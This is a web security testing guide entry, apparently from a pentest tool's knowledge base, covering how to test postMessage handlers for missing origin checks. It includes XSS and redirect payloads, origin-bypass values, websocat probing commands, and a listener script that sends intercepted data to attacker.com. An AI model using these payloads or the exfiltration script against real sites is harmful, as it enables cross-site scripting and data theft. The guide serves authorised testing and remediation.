---
id: WSTG-CLNT-10
title: Testing Web Messaging
category: Client-Side
severity_range: Low-Medium
owasp_ref: https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_Web_Messaging
---

# WSTG-CLNT-10: Testing Web Messaging

## Summary

The `window.postMessage()` API enables cross-origin communication between browser windows, iframes, and frames. When message handlers do not validate the origin of incoming messages or sanitize message data before processing, attackers can send malicious messages from a cross-origin page to trigger DOM XSS, modify application state, steal data, or bypass security controls. Additionally, if `postMessage` sends sensitive data with an unrestricted target origin (`*`), any page can intercept the data.

## Test Objectives

- Identify `postMessage` senders and receivers in application JavaScript
- Test if message handlers validate the origin of incoming messages
- Test if message data is sanitized before use in DOM manipulation
- Check if sensitive data is sent via `postMessage` with unrestricted target origins

## Prerequisites

- Target application uses `postMessage` API for cross-origin communication
- Docker pentest container capturing traffic
- JavaScript source code accessible for analysis

## Test Steps

### Step 1: Identify postMessage Usage

**CLI Actions:**
Use `curl` to fetch JavaScript files and search for postMessage patterns:

```
GET /static/js/app.js HTTP/1.1
Host: target.com
```

Search for message senders:
```javascript
window.postMessage(data, targetOrigin)
parent.postMessage(data, targetOrigin)
iframe.contentWindow.postMessage(data, targetOrigin)
opener.postMessage(data, targetOrigin)
```

Search for message receivers:
```javascript
window.addEventListener('message', handler)
window.onmessage = handler
$(window).on('message', handler)
```

### Step 2: Analyze Message Handler Origin Validation

**CLI Actions:**
Use `curl` to fetch and analyze the message handler code:

```
GET /static/js/messaging.js HTTP/1.1
Host: target.com
```

Check if handlers validate `event.origin`:

Vulnerable pattern (no origin check):
```javascript
window.addEventListener('message', function(event) {
    document.getElementById('output').innerHTML = event.data;
});
```

Weak validation:
```javascript
window.addEventListener('message', function(event) {
    if (event.origin.indexOf('target.com') > -1) {  // substring match, bypassable
        processData(event.data);
    }
});
```

Proper validation:
```javascript
window.addEventListener('message', function(event) {
    if (event.origin !== 'https://target.com') return;
    processData(event.data);
});
```

### Step 3: Test Sending Malicious Messages

**CLI Actions:**
This test primarily requires creating a proof-of-concept HTML page, but you can use http_probe to analyze the message handling.

Use `curl` to fetch the target page:

```
GET /page-with-message-handler HTTP/1.1
Host: target.com
```

Analyze how the received message data is used. If it flows to:
- `innerHTML` / `outerHTML` -> potential XSS
- `eval()` / `Function()` -> code execution
- `location.href` / `window.open()` -> open redirect
- `document.write()` -> DOM manipulation
- Application state variables -> logic manipulation

### Step 4: Test Origin Validation Bypass

**CLI Actions:**
If origin validation exists but uses weak patterns, identify bypass opportunities:

If handler checks `event.origin.endsWith('target.com')`:
```
Attacker origin: https://eviltarget.com (matches endsWith)
Attacker origin: https://target.com.attacker.com (may match)
```

If handler checks `event.origin.indexOf('target.com') !== -1`:
```
Attacker origin: https://target.com.attacker.com (substring match)
```

Use `curl` to fetch the handler code and document the exact validation logic.

### Step 5: Check for Sensitive Data in postMessage

**CLI Actions:**
Use `curl` to fetch JavaScript code that sends messages:

```
GET /static/js/auth.js HTTP/1.1
Host: target.com
```

Look for sensitive data being sent with unrestricted target origin:
```javascript
parent.postMessage({token: sessionToken, user: userData}, '*');
// The '*' allows ANY origin to receive this message
```

Data types to look for: session tokens, user data, API keys, CSRF tokens, authentication status.

### Step 6: Test Message-Based DOM Manipulation

**CLI Actions:**
Use `curl` to collect all JavaScript files. Search for patterns where received message data modifies the DOM:

```javascript
window.addEventListener('message', function(e) {
    document.getElementById('content').innerHTML = e.data.html;
    document.title = e.data.title;
    window.location = e.data.redirect;
});
```

Each DOM modification point is a potential vulnerability if origin validation is missing.

Use `rynix_plugin_run('template-scan')` to check for postMessage-related findings.

## Payloads

### XSS via postMessage
```javascript
// Attacker page sends:
targetWindow.postMessage('<img src=x onerror=alert(document.cookie)>', '*');
targetWindow.postMessage('<svg onload=alert("XSS")>', '*');
targetWindow.postMessage({html: '<script>alert("XSS")</script>'}, '*');
```

### Redirect via postMessage
```javascript
targetWindow.postMessage({redirect: 'https://attacker.com/phishing'}, '*');
targetWindow.postMessage({url: 'javascript:alert("XSS")'}, '*');
```

### State Manipulation via postMessage
```javascript
targetWindow.postMessage({action: 'setAdmin', value: true}, '*');
targetWindow.postMessage({action: 'updateBalance', amount: 999999}, '*');
targetWindow.postMessage({authenticated: true, role: 'admin'}, '*');
```

### Origin Bypass Values
```
https://eviltarget.com          (endsWith bypass)
https://target.com.attacker.com (indexOf bypass)
https://attackertarget.com      (indexOf bypass)
null                            (from sandboxed iframe)
```

### Data Interception
```html
<!-- Attacker page to intercept postMessage data sent with '*' origin -->
<script>
window.addEventListener('message', function(event) {
    fetch('https://attacker.com/log?data=' + encodeURIComponent(JSON.stringify(event.data)));
});
</script>
```

### WebSocket Testing with websocat

**CLI Actions:**
Use `websocat` to connect to and test WebSocket endpoints:

```bash
# Send a test message and capture response
echo '{"action":"test","data":"payload"}' | docker exec -i rynix-tools websocat wss://target.com/ws -H "Cookie: session=abc123"

# Send multiple messages from a file
docker exec -i rynix-tools websocat wss://target.com/ws -H "Cookie: session=abc123" < ws-messages.txt

# Test without authentication (check if auth is required)
echo '{"action":"test"}' | docker exec -i rynix-tools websocat wss://target.com/ws
```

**Test for:**
- Authentication bypass: Connect without session cookie — if messages are accepted, auth is missing
- Origin validation: Connect with `-H "Origin: https://evil.com"` — if accepted, origin check is missing
- Input injection: Send XSS payloads, SQL injection, and command injection through WebSocket messages
- Message tampering: Modify message fields (IDs, roles, amounts) to test server-side validation

**Note**: websocat does not support HTTP proxy — WebSocket traffic will not appear via http_probe.

## Detection Criteria

A finding should be logged when:
- Message handlers do not validate `event.origin` before processing
- Origin validation uses weak patterns (substring, indexOf, endsWith)
- Message data flows to dangerous sinks (innerHTML, eval, location) without sanitization
- Sensitive data is sent via `postMessage` with `*` target origin
- Message handlers can be used to manipulate application state
- No content-type validation on received message data

## Severity Assessment

| Condition | Severity |
|-----------|----------|
| postMessage data flows to innerHTML/eval without origin check (DOM XSS) | High |
| Sensitive data (tokens, credentials) sent with `*` target origin | High |
| Origin validation bypassable + data flows to dangerous sinks | Medium |
| postMessage used for authentication state without proper origin check | Medium |
| Open redirect via postMessage without origin validation | Medium |
| Weak origin validation but no dangerous sink identified | Low |
| postMessage used for non-sensitive UI updates without origin check | Low |
| Proper origin validation and data sanitization | Not a finding |

## Remediation

- Always validate `event.origin` using strict equality comparison before processing
- Use exact origin matching, not substring or regex-based checks
- Sanitize all message data before using in DOM manipulation (use textContent, not innerHTML)
- When sending messages, specify the exact target origin, never use `*`
- Do not send sensitive data (tokens, credentials) via postMessage
- Validate the structure and type of received message data
- Use structured clone algorithm-safe data types
- Implement Content-Security-Policy to mitigate XSS impact from message handling
- Document all cross-origin communication channels and their expected message formats

## References

- [OWASP Testing Guide - Web Messaging](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/11-Client-side_Testing/10-Testing_Web_Messaging)
- [CWE-345: Insufficient Verification of Data Authenticity](https://cwe.mitre.org/data/definitions/345.html)
- [MDN - Window.postMessage()](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage)

## Rynix workflow

1. `scope_check` and `register_scope` for the target host.
2. `get_wstg_test` for this test ID — read objectives.
3. Execute probes via `http_probe` / `compare_role_response` / `run_idor_matrix`.
4. `track_wstg_test` with status and evidence path.
5. `record_finding` only when verified with probe evidence.

## Evidence requirements

- Request/response snippet or `compare_role_response` diff.
- Session ID on all tool calls.
- No unverified claims in `export_report`.
## ASVS mapping

- V3 Session Management — client-side token storage.
- V5 Validation — DOM sinks and postMessage origins.

## CWE references

- CWE-79: XSS
- CWE-1021: Improper Restriction of Rendered UI Layers

## Rynix tooling

- Primary tools: ``list_frontend_routes``, ``http_probe``, ``rynix_plugin_run` (browser-debug)`

## Test focus

- Map client routes; verify server enforces auth regardless of UI guards.

## GenAI / LLM 2026 notes

- Cross-reference `knowledge/custom/genai_llm_security_2026.md` (OWASP LLM Top 10 mapping).
- Probe AI endpoints with `http_probe` only — no external LLM API keys in Rynix runtime.
- Use `compare_role_response` to detect cross-tenant prompt/response leakage.
- Map findings to LLM01–LLM10 categories in `export_report`.

